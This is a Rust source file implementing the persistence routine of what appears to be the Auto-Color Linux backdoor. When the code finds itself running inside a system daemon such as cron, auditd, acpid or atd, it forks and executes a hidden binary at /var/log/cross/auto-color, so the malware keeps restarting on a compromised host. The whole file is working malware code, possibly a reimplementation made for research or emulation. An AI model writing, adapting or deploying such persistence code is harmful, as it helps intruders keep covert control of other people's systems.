use core::panic;
use std::path::PathBuf;
use std::ffi::CString;

use libc::execl;
use errno::errno;
use log::{info, warn, error};

pub fn persist() {
    info!("[persist] Starting persistence check");

    // Check current process full path
    let current_process_path = std::env::current_exe().unwrap();

    let known_daemons: &[PathBuf] = &[
        PathBuf::from("/sbin/auditd"),
        PathBuf::from("/sbin/cron"),
        PathBuf::from("/sbin/crond"),
        PathBuf::from("/sbin/acpid"),
        PathBuf::from("/sbin/atd"),
        PathBuf::from("/usr/sbin/auditd"),
        PathBuf::from("/usr/sbin/cron"),
        PathBuf::from("/usr/sbin/crond"),
        PathBuf::from("/usr/sbin/acpid"),
        PathBuf::from("/usr/sbin/atd"),
        PathBuf::from("/usr/bin/tail"),
    ];

    if !known_daemons.contains(&current_process_path) {
        warn!("[persist] Current process is not a known daemon, skipping persistence");
        return;
    }

    info!("[persist] Current process path is a target: {:?}", current_process_path);

    let binary_path = PathBuf::from("/var/log/cross/auto-color");
    if !binary_path.exists() {
        warn!("[persist] Binary path does not exist: {:?}", binary_path);
        return;
    }

    let binary_cstr = CString::new(binary_path.to_str().unwrap()).unwrap();
    let arg1 = CString::new("-flush").unwrap();
    let arg2 = CString::new("-color").unwrap();

    info!("[persist] Executing binary");

    unsafe {
        let pid = libc::fork();
        if pid == -1 {
            let err = errno();
            error!("[persist] Fork failed: errno: {}, message: {}", err.0, err);
            return;
        }

        if pid == 0 {
            // Child process
            if execl(
                binary_cstr.as_ptr(),
                binary_cstr.as_ptr(),
                arg1.as_ptr(),
                arg2.as_ptr(),
                std::ptr::null::<std::os::raw::c_char>(),
            ) == -1
            {
                let err = errno();
                error!("[persist] Failed to execute binary: errno: {}, message: {}", err.0, err );
            }
            std::process::exit(0);
        } else {
            // Parent process
            info!("[persist] Forked child process with PID: {}", pid);
        }
    }

}

